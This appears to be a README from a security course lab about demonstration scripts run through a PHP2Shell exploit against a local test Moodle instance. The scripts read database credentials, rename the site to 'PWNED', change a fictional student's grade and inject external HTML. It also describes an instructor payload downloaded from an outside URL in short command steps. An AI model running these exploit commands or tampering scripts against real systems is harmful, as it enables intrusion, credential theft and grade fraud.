# Moodle Test Effect Examples

These files are starting points for the in-class demonstrations and the after-class assignment. They are not the exploit core. They only touch fictional test data, and you must reset them after use.

| Effect | Example | Reset | What it changes |
|---|---|---|---|
| Front-page name | `homepage.php` | `reset-homepage.php` | `fullname` / `shortname` of `mdl_course` id=1 |
| Fictional grade | `grade.php` | `reset-grade.php` | Changes the existing `作業系統 / Midterm` grade from 30.00 to 100.00 |
| Good-hacker image | `good-hacker.php` | `reset-good-hacker.php` | front-page image link and `good-hacker.webp` |

## Data lifecycle

| Data | Type | Created when | On reset |
|---|---|---|---|
| `p2s_student` | Seed data | First initialization; checked on every later start | Kept |
| `作業系統` course | Baseline | First initialization | Kept |
| `Midterm` grade | Baseline/test value | First initialization (30.00); `grade.php` sets 100.00 | `reset-grade.php` writes 30.00 |
| `impact.txt`, `PWNED` site name | Test data | Running `homepage.php` | Restored and deleted |
| External `good-hacker.webp` link | Test data | Running `good-hacker.php` | Restored |

Do not rename the baseline `OS` course or `Midterm` item, or you may confuse the reset scope of the examples.

## Common procedure

Copy each example into `loot/`, then trigger it with `sh</loot/c`. The front-page name is the example below:

```sh
cp labs/examples/homepage.php loot/homepage.php
printf 'php /loot/homepage.php\n' > loot/c

rm -f loot/p1
python3 php2shell/exploit.py \
  -u http://127.0.0.1:8080/index.php \
  --profile official83 --docker-container "$CONTAINER" \
  --proof-file loot/p1 -c 'sh</loot/c'

cat loot/p1
```

Resetting uses the same path:

```sh
cp labs/examples/reset-homepage.php loot/reset-homepage.php
printf 'php /loot/reset-homepage.php\n' > loot/c

python3 php2shell/exploit.py \
  -u http://127.0.0.1:8080/index.php \
  --profile official83 --docker-container "$CONTAINER" \
  --proof-file loot/p1 -c 'sh</loot/c'
```

See [`../student/lab-guide.md`](../student/lab-guide.md) for how to get `CONTAINER`. Run every command from the project root.

## Individual effects

### Front-page name

`homepage.php` reads the DB settings from `/var/www/config/config.php`, connects to MariaDB, renames the front-page course to `PWNED by PHP2Shell`, and writes `/var/www/html/impact.txt` and `/loot/p1`.

Check:

```sh
curl -s http://127.0.0.1:8080/impact.txt
curl -s http://127.0.0.1:8080/login/index.php | grep -o '<title>[^<]*</title>'
```

The title should contain `PWNED by PHP2Shell`. After reset, it returns to `首頁 | NCKU Moodle`.

### Fictional grade

`grade.php` changes the existing `作業系統 / Midterm` grade for `p2s_student`. The demo value is 100. You can pass 0–100:

```sh
cp labs/examples/grade.php loot/grade.php
printf 'php /loot/grade.php 100\n' > loot/c
```

Check:

```sh
curl -s http://127.0.0.1:8080/grade-demo.txt
```

The output contains `grade-state=complete grade=100.00 ... db=verified`, `courseid`, and `userid`. `grade.php` writes progress to `loot/grade-progress.txt`; only when the database read-back matches does it write the completion proof to `loot/p1` and `grade-demo.txt`.

To see the Gradebook in Moodle, log in as admin at `/login/index.php`, then open `/grade/report/grader/index.php?id=<courseid>`. The test student is `p2s_student`, password `StudentOnly-2026`.

Reset writes the grade back to 30.00 and deletes `grade-demo.txt`. The course, grade item, and `p2s_student` are kept, and reset can be run more than once.

### Good-hacker image

`good-hacker.php` appends a linked image to `additionalhtmltopofbody`. The image is loaded from `https://s.xn--kst.tw/good-hacker.webp`, so the target does not need a local copy. Clicking the image opens its linked video in a new tab. There is no separate image page and no site-wide redirect.

```sh
cp labs/examples/good-hacker.php loot/good-hacker.php
printf 'php /loot/good-hacker.php\n' > loot/c
```

Check:

```sh
curl -s http://127.0.0.1:8080/ | grep -o 's.xn--kst.tw/good-hacker.webp\|youtube.com/watch?v=dQw4w9WgXcQ'
```

Open `http://127.0.0.1:8080/` to see the image. The image and video are external, so the browser needs network access; the Moodle page HTML is still present.

Reset `reset-good-hacker.php` restores the saved top-of-page HTML. It does not change the site name or grade. Reset can be repeated; when there is nothing to restore, it returns `top=already-baseline`. If you ran the front-page effect earlier, also run `reset-homepage.php`.

## Instructor payload

`moodle-payload.php` is the single payload used by the instructor controller. The controller defaults to `https://s.xn--kst.tw/A` for the payload; override it with `DEMO_PAYLOAD_URL`. The payload contains the good-hacker image URL. The controller passes a compact code through the PoC and supports:

- `0` to clear the previous HTTP proof
- `1` homepage and `2` reset-homepage
- `g<base36>` to set an integer grade, such as `g2s` for 100
- `5` good-hacker and `6` reset-good-hacker

It is not a web endpoint and is not part of the student Flag challenge. The controller and the short-URL delivery requirements are instructor-side; students use the smaller examples above. Run `sh scripts/instructor-demo.sh setup` once after Moodle starts. The controller uses `scripts/short_command_planner.py` to split this one payload download into <=14-byte PoC steps; later effect commands stay short. It reads `/demo-proof.txt` from the target over HTTP and never accesses `loot/` or the Docker container. Its SHA-256 check uses Python, so it works on macOS and Linux. If `DEMO_PAYLOAD_SHA256` is omitted, it hashes the local payload file.

## Data you must not touch

- Do not change real student grades, real accounts, or the official school site.
- Do not point the examples at courses or users other than `OS` / `p2s_student`.
- Do not modify Moodle core, the DB schema, or the exploit source just to make an effect succeed.
- Reset after every effect and keep `before`, `after`, and `reset` evidence.
- After reset, run `sh scripts/cleanup-artifacts.sh` to remove the fixed lab artifacts.

## Fourth effect

The after-class assignment asks you to design a test-data change that differs from the three effects above. See [`fourth-effect-template.md`](fourth-effect-template.md) for directions, editable fields, and the evidence format.
